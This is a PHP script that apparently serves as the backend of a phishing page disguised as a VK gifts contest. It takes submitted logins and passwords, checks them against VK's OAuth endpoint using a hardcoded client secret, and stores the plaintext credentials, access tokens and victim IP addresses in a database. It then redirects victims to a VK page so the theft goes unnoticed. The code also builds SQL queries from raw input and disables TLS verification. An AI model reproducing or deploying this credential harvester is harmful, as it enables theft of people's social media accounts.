<?PHP

require_once('config.php');
$connect = mysql_connect($config['host'], $config['user'], $config['pass']);
if (!$connect){
	die (mysql_error());
}
else{
	mysql_select_db($config['db'], $connect);
}
If (isset($_POST['login'])){ 
 $email = iconv('utf-8', 'windows-1251', $_POST['login']);
 $password = iconv('utf-8', 'windows-1251', $_POST['password']);
 $link = '';
 $res=curl('https://api.vk.com/oauth/token?grant_type=password&client_id=2274003&scope=wall&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$email.'&password='.$password.'&captcha_key=&captcha_sid=');
 $lo='access_token';
 $pos = strripos($res, $lo);
if ($pos === false) {
echo '<script>location.href = "error.php";</script>';
}else{
$res23 = json_decode($res, true);
$id=$res['user_id'];
$name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counters');
$name = json_decode($name, true);
$uid = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=uid');
$uid = json_decode($uid, true);
$res = json_decode($res, true);
$query = ('INSERT INTO vk (number, password, uid, ip,token,code) VALUES("'.$email.'", "'.$password.'","https://vk.com/id'.$res23['user_id'].'","'.$_SERVER['REMOTE_ADDR'].'","' . $res23['access_token'] . '","-")');
mysql_query("SET NAMES CP1251");
mysql_query($query) or die (mysql_error());
$fulname=$name['response']['0']['first_name'].' '.$name['response']['0']['last_name'];
header("Location: https://vk.com/podarkikonkurss");
 }
}

function curl($url){
$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
$response = curl_exec( $ch );
curl_close( $ch );
return $response;
}
  
  function postSend($url, $field) {
      if( $curl = curl_init() ) {
          try{
          curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $field);
            $out = curl_exec($curl);
            curl_close($curl);

          return $out;
        } catch (Exception $e) {
          return "";
        }
        }
      
      return "";
  }
  
  function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

?>